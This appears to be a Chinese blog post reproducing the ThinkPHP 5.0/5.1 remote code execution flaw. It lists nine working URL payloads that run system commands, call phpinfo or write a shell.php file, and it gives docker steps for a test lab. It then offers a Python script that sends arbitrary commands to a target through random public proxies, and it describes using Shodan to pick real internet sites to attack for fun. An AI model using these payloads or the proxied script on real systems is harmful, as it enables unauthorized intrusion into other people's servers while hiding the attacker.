---
title: Thinkphp5-getshell复现
tags: 渗透测试
---
ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架
![图标](https://static.dingtalk.com/media/lALPDgQ9rM5RBxHNAfTNA4Q_900_500.png)

<!--more-->

## 一、漏洞详情
由于框架对控制器名没有进行足够的检测，会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本，推荐尽快更新到最新版本。

参考链接：https://blog.thinkphp.cn/869075
{:.info}

## 二、测试payload
其实我一直等一个大佬分析漏洞原理，但是没有看到圈子里有人发表相关文章，只好自己来告诉大家这个漏洞的消息。但是由于本人实在是技术小白，所以写不出来漏洞原理，只能发一波payload了
```
1、index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
2、index.php?s=index/\think\Request/input&filter=phpinfo&data=1
3、index.php?s=index/\think\Request/input&filter=system&data=id
4、index.php?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E
5、index.php?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E
6、index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
7、index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
8、index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
9、index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```
## 三、复现
- 有了payload，剩下的就是搭建复现环境了。这里给大家说一下我的习惯：直接用docker pull，有的表哥可能喜欢自己搭一遍，这样能够学到更多的东西，但是我为了图方便，一般都是直接用docker实现了
- 安装docker应该大家都会，如果有人不是很了解docker的话，我这里讲一个非常简单的方法：在centos7里先yum -y updat确保自己的最新的，然后重启，执行yum -y install docker*，这样很简单的就把docker装上了

然后：
```
docker pull docker.io/clarencep/tp5-dev
docker run -d --name thinkphp5 -p 8000:8000 docker.io/clarencep/tp5-dev
```

然后就可以访问http://ip:8000来看一下是否成功  

![测试环境](https://static.dingtalk.com/media/lALPDgQ9rM621HrNAhLNA14_862_530.png)

确认成功跑起来之后选一个payload来访问就可以了  

![测试payload](https://static.dingtalk.com/media/lALPDgQ9rM64DNrNAszNBMw_1228_716.png)  
## 四、愉快玩耍
- 有了payload，就可以写一个简单的脚本来玩了
```
#coding=utf-8
import requests,sys,random
proxy_list=[
    '223.203.0.14:8000',
    '183.166.129.53:8080',
    '103.205.26.84:41805',
    '61.135.155.82:443',
    '218.17.139.5:808'
]
def poc(site,command):
    url=site+'/index.php?s=Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]='+command
    headers={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0'}
    proxies={
        'http':'http://'+random.choice(proxy_list),
        'https':'https://'+random.choice(proxy_list)
        }
    req=requests.get(url,headers=headers,proxies=proxies)
    print(req.text)
    print('-----------------------------------------')
try:
    site=sys.argv[1]
    command=sys.argv[2]
except:
    site=raw_input('Please input your site:')
    print('-----------------------------------------')
    while True:
        command=raw_input('Command:')
        poc(site,command)
poc(site,command)
```

我在脚本里写了几个随便在网上找的代理IP，大家也可以写自己的  

去shodan上看一眼：

![shodan](https://static.dingtalk.com/media/lALPDgQ9rM65YKfNA33NBX0_1405_893.png)  

哇，好多thinkphp5的网站，随便挑一个  

![上手](https://static.dingtalk.com/media/lALPDgQ9rM65oJbNAc7NAj8_575_462.png)  

我早上看的时候还好好地，现在已经被人传进去这么多马了，还有asp的，真的娘的是个人才